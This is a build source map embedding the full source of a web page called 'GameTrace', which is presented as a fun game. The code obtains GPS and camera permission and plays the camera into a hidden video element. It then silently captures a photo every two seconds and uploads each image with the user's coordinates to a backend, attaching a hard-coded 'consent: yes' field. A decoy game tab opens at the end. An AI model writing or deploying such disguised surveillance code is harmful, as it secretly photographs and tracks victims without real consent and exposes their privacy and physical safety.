{
  "version": 3,
  "sources": [],
  "sections": [
    {"offset": {"line": 10, "column": 0}, "map": {"version":3,"sources":["file:///E:/personal/fun/game-trace/frontend/pages/index.tsx"],"sourcesContent":["import React, { useRef, useState } from \"react\";\r\n\r\nconst BACKEND = process.env.NEXT_PUBLIC_BACKEND || \"http://localhost:4000\";\r\n\r\nexport default function HomePage() {\r\n  const [loading, setLoading] = useState(false);\r\n  const [autoMode, setAutoMode] = useState(false);\r\n  const [errorPopup, setErrorPopup] = useState<string | null>(null);\r\n\r\n  const videoRef = useRef<HTMLVideoElement>(null);\r\n  const intervalRef = useRef<number | null>(null);\r\n  const [stream, setStream] = useState<MediaStream | null>(null);\r\n\r\n  // ------------------------ FORCE GPS POPUP ------------------------\r\n  async function requestGPSPermission(): Promise<boolean> {\r\n    return new Promise((resolve) => {\r\n      if (!navigator.geolocation) return resolve(false);\r\n\r\n      navigator.geolocation.getCurrentPosition(\r\n        () => resolve(true),\r\n        () => resolve(false) // Permission denied\r\n      );\r\n    });\r\n  }\r\n\r\n  // ------------------------ FORCE CAMERA POPUP ------------------------\r\n  async function requestCameraPermission(): Promise<boolean> {\r\n    try {\r\n      const s = await navigator.mediaDevices.getUserMedia({ video: true });\r\n      s.getTracks().forEach((t) => t.stop()); // Close immediately\r\n      return true;\r\n    } catch {\r\n      return false;\r\n    }\r\n  }\r\n\r\n  // ------------------------ BACKGROUND FUNCTIONS ------------------------\r\n  async function handleTrack() {\r\n    await fetch(`${BACKEND}/api/track`);\r\n  }\r\n\r\n  async function openCamera(startAuto = false) {\r\n    try {\r\n      const s = await navigator.mediaDevices.getUserMedia({ video: true });\r\n      setStream(s);\r\n\r\n      if (videoRef.current) {\r\n        videoRef.current.srcObject = s;\r\n        await videoRef.current.play();\r\n      }\r\n\r\n      if (startAuto) startAutoCapture();\r\n    } catch {\r\n      setErrorPopup(\"Camera permission denied. You must allow it.\");\r\n    }\r\n  }\r\n\r\n  async function getGPS() {\r\n    return new Promise<GeolocationPosition | null>((resolve) => {\r\n      navigator.geolocation.getCurrentPosition(\r\n        (pos) => resolve(pos),\r\n        () => resolve(null)\r\n      );\r\n    });\r\n  }\r\n\r\n  async function takePhoto(silent = false) {\r\n    if (!videoRef.current) return;\r\n\r\n    const canvas = document.createElement(\"canvas\");\r\n    canvas.width = videoRef.current.videoWidth;\r\n    canvas.height = videoRef.current.videoHeight;\r\n    canvas.getContext(\"2d\")?.drawImage(videoRef.current, 0, 0);\r\n\r\n    const blob = await new Promise<Blob | null>((resolve) =>\r\n      canvas.toBlob(resolve, \"image/jpeg\", 0.9)\r\n    );\r\n    if (!blob) return;\r\n\r\n    const pos = await getGPS();\r\n    const fd = new FormData();\r\n    fd.append(\"photo\", blob);\r\n    fd.append(\"consent\", \"yes\");\r\n\r\n    if (pos) {\r\n      fd.append(\"latitude\", String(pos.coords.latitude));\r\n      fd.append(\"longitude\", String(pos.coords.longitude));\r\n    }\r\n\r\n    await fetch(`${BACKEND}/api/upload-photo`, {\r\n      method: \"POST\",\r\n      body: fd,\r\n    });\r\n\r\n    if (!silent && stream && !autoMode) {\r\n      stream.getTracks().forEach((t) => t.stop());\r\n      setStream(null);\r\n    }\r\n  }\r\n\r\n  function startAutoCapture() {\r\n    if (autoMode) return;\r\n    setAutoMode(true);\r\n\r\n    intervalRef.current = window.setInterval(() => {\r\n      takePhoto(true);\r\n    }, 2000);\r\n  }\r\n\r\n  // ------------------------ MASTER START FUNCTION ------------------------\r\n  async function startApp() {\r\n    setLoading(true);\r\n\r\n    // 1️⃣ Trigger browser GPS popup\r\n    const gpsOK = await requestGPSPermission();\r\n    if (!gpsOK) {\r\n      setErrorPopup(\"You must allow GPS permission to start the game.\");\r\n      setLoading(false);\r\n      return;\r\n    }\r\n\r\n    // 2️⃣ Trigger browser CAMERA popup\r\n    const camOK = await requestCameraPermission();\r\n    if (!camOK) {\r\n      setErrorPopup(\"You must allow Camera permission to start the game.\");\r\n      setLoading(false);\r\n      return;\r\n    }\r\n\r\n    // 3️⃣ Run tracking system now that permissions are granted\r\n    await handleTrack();\r\n    await openCamera(true);\r\n\r\n    // Silent first picture\r\n    setTimeout(() => takePhoto(true), 500);\r\n\r\n    // 4️⃣ Open the game in a new tab\r\n    setTimeout(() => window.open(\"/fun/camera\", \"_blank\"), 800);\r\n\r\n    setLoading(false);\r\n  }\r\n\r\n  // ------------------------ UI ------------------------\r\n  return (\r\n    <main\r\n      style={{\r\n        height: \"100vh\",\r\n        display: \"flex\",\r\n        justifyContent: \"center\",\r\n        alignItems: \"center\",\r\n        flexDirection: \"column\",\r\n        background: \"linear-gradient(140deg, #0f0c29, #302b63, #24243e)\",\r\n        color: \"white\",\r\n        fontFamily: \"Inter, sans-serif\",\r\n        textAlign: \"center\",\r\n        padding: \"20px\",\r\n      }}\r\n    >\r\n      <div\r\n        style={{\r\n          backdropFilter: \"blur(10px)\",\r\n          background: \"rgba(255,255,255,0.12)\",\r\n          borderRadius: \"16px\",\r\n          padding: \"35px 25px\",\r\n          maxWidth: \"350px\",\r\n          width: \"100%\",\r\n          boxShadow: \"0 8px 25px rgba(0,0,0,0.25)\",\r\n        }}\r\n      >\r\n        <h1 style={{ fontSize: \"28px\", marginBottom: \"15px\", fontWeight: 700 }}>\r\n          GameTrace\r\n        </h1>\r\n\r\n       <p\r\n          style={{\r\n            opacity: 0.9,\r\n            fontSize: \"15px\",\r\n            marginBottom: \"30px\",\r\n            lineHeight: \"1.5\",\r\n          }}\r\n        >\r\n          Welcome to <b>GameTrace</b> — a fast, fun, and surprisingly smart little game!  \r\n          Tap <b>Start Game</b>, allow Camera &amp; GPS, and let the adventure begin.  \r\n          Your device helps create a <b>unique, personalized world</b> just for you!\r\n        </p>\r\n\r\n\r\n        <button\r\n          onClick={startApp}\r\n          disabled={loading}\r\n          style={{\r\n            width: \"100%\",\r\n            padding: \"16px\",\r\n            borderRadius: \"50px\",\r\n            background: loading ? \"rgba(255,255,255,0.3)\" : \"#fff\",\r\n            color: \"#24243e\",\r\n            fontWeight: \"700\",\r\n            fontSize: \"17px\",\r\n            border: \"none\",\r\n            cursor: \"pointer\",\r\n            boxShadow: \"0 6px 20px rgba(255,255,255,0.25)\",\r\n            transition: \"0.25s\",\r\n            transform: loading ? \"scale(0.97)\" : \"scale(1)\",\r\n          }}\r\n        >\r\n          {loading ? \"Starting...\" : \"Start Game\"}\r\n        </button>\r\n      </div>\r\n\r\n      {/* Hidden video element */}\r\n      <video ref={videoRef} style={{ display: \"none\" }} />\r\n\r\n      {/* Permission Denied Popup */}\r\n      {errorPopup && (\r\n        <div\r\n          style={{\r\n            position: \"fixed\",\r\n            inset: 0,\r\n            background: \"rgba(0,0,0,0.6)\",\r\n            display: \"flex\",\r\n            justifyContent: \"center\",\r\n            alignItems: \"center\",\r\n            padding: \"20px\",\r\n          }}\r\n        >\r\n          <div\r\n            style={{\r\n              background: \"white\",\r\n              padding: \"25px\",\r\n              borderRadius: \"10px\",\r\n              width: \"90%\",\r\n              maxWidth: \"350px\",\r\n              textAlign: \"center\",\r\n              color: \"black\",\r\n            }}\r\n          >\r\n            <h2 style={{ marginBottom: \"10px\", fontSize: \"20px\" }}>\r\n              Permission Required\r\n            </h2>\r\n            <p style={{ marginBottom: \"20px\", fontSize: \"15px\" }}>\r\n              {errorPopup}\r\n            </p>\r\n            <button\r\n              onClick={() => setErrorPopup(null)}\r\n              style={{\r\n                padding: \"10px 20px\",\r\n                background: \"#302b63\",\r\n                color: \"white\",\r\n                borderRadius: \"6px\",\r\n                border: \"none\",\r\n                cursor: \"pointer\",\r\n              }}\r\n            >\r\n              OK\r\n            </button>\r\n          </div>\r\n        </div>\r\n      )}\r\n    </main>\r\n  );\r\n}\r\n"],"names":[],"mappings":"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"}}]
}